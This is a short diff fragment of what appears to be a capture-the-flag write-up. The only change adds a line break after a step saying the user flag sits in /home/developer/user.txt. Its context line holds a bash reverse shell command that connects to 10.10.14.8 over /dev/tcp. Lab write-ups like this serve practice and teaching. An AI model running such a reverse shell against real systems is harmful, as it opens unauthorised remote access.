@@ -47,7 +47,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.8/777 0>&1'
 Host:<br>
 ![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e6895636-9c7c-4ab3-97f0-fb5a8f163d04)
 
-12. It works! the flag can be found in **/home/developer/user.txt**.
+12. It works! the flag can be found in **/home/developer/user.txt**.<br>
 ![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/ca080e46-3b76-45a0-96cd-91efe3cfd8af)
 
 13. For the root, my first guess is admin account. 
